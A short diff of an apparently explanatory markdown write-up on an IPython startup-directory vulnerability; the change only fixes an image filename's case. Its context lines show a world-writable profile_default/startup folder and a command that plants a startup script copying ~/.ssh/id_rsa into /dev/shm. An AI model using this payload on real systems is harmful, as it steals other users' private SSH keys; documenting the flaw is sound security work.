@@ -131,7 +131,7 @@ mkdir -m 777 profile_default/startup
 ```console
 echo "import os; os.system('cat ~/.ssh/id_rsa > /dev/shm/key')" > profile_default/startup/foo.py
 ```
-![ipythonVulnerability](./images/ipythonvulnerability.png)
+![ipythonVulnerability](./images/ipythonVulnerability.png)
 
 
 
